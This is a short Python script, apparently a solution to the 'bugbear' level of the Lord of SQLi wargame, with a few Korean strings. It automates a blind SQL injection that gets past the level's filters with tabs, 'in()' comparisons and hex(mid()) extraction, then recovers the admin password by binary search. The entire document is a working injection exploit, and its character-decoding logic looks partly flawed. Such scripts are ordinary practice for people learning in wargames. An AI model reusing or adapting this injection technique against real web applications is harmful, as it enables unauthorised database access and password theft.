import requests

url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"
cookies = { "PHPSESSID" : "쿠키값" }

def pw_length():
    length = 1

    while True:
        params = { "pw" : "123",
        "no" : "\"\"\t||\tid\tin(\"admin\")\t&&\tlength(pw)\tin({})\t#".format(length) }
        request = requests.get(url, params=params, cookies=cookies)

        if "Hello admin" in request.text:
            return length
        else:
            length += 1

def pw_crack():
    password_length = pw_length()
    password = ''

    for i in range(1, password_length+1):
        start, end, mid = 1, 127, 64
        while True:
            params = { "pw" : "123",
            "no" : "\"\"\t||\tid\tin(\"admin\")\t&&\thex(mid(pw,\t{},\t1))\tin({})\t#".format(i, mid) }
            request = requests.get(url, params=params, cookies=cookies)

            if "Hello admin" in request.text:
                password = password + chr(int(str(mid), 16))
                print("패스워드:", password)
                break
            else:
                params = { "pw" : "123",
                "no" : "\"\"\t||\tid\tin(\"admin\")\t&&\thex(mid(pw,\t{},\t1))\t>\t{}\t#".format(i, mid) }
                request = requests.get(url, params=params, cookies=cookies)

                if "Hello admin" in request.text:
                    start = mid
                    mid = (mid + end) // 2
                else:
                    end = mid
                    mid = (start + end) // 2

pw_crack()
